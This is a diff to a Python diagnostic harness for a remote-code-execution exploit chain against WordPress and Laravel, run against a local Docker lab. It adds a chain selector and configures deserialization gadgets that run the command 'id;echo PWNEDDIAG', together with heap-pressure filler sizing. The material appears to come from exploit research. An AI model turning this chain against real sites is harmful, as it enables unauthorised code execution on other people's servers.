@@ -13,7 +13,10 @@ and prints the attempt's file state at the end. This is a DIAGNOSTIC
 harness (docker exec / cgroup reads are fine here); the exploit itself
 never touches any of it.
 
-usage: wp_diagnose.py [port] [container] [h]
+usage: wp_diagnose.py [port] [container] [h] [chain]
+
+chain is "wordpress" (default) or "laravel"; the harness then
+reproduces that chain's exact attempt flow.
 """
 from __future__ import annotations
 
@@ -32,19 +35,25 @@ def main() -> int:
     if len(sys.argv) > 2:
         lab.CONTAINER = sys.argv[2]
     h = int(sys.argv[3]) if len(sys.argv) > 3 else 46_000_000
+    chain = sys.argv[4] if len(sys.argv) > 4 else "wordpress"
     lab.set_geometry("big")
     lab.HOST, lab.PORT = "127.0.0.1", port
     sid = lab.sid_new()
 
-    # Reproduce the wordpress chain exactly as the exploit runs it:
-    # 8 fillers (h // 8 per filler, each <= F_MAX=7MiB) and the real
-    # WP_HTML_Token gadget. Without this the harness pushes h // 4
-    # = 14MiB per filler into a 7MiB Content-Length field - the extra
-    # bytes never become pressure and the measurement lies.
-    lab.set_gadget("wordpress", "id;echo PWNEDDIAG")
-    lab.wp_align_geometry()
-    remote.ACTIVE_FILLERS = 8
-    remote.WP_MARKER = "PWNEDDIAG"
+    # Reproduce the chosen chain exactly as the exploit runs it:
+    # the chain's own filler count (h // N per filler, each <=
+    # F_MAX=7MiB) and its real gadget. Without this the harness can
+    # push h // 4 = 14MiB per filler into a 7MiB Content-Length
+    # field - the extra bytes never become pressure and the
+    # measurement lies.
+    if chain == "laravel":
+        lab.set_gadget("laravel", "id;echo PWNEDDIAG")
+        remote.ACTIVE_FILLERS = remote.N_FILLERS
+    else:
+        lab.set_gadget("wordpress", "id;echo PWNEDDIAG")
+        lab.wp_align_geometry()
+        remote.ACTIVE_FILLERS = 8
+    remote.OUT_MARKER = "PWNEDDIAG"
 
     # one docker exec sampling everything inside the container
     sh = (
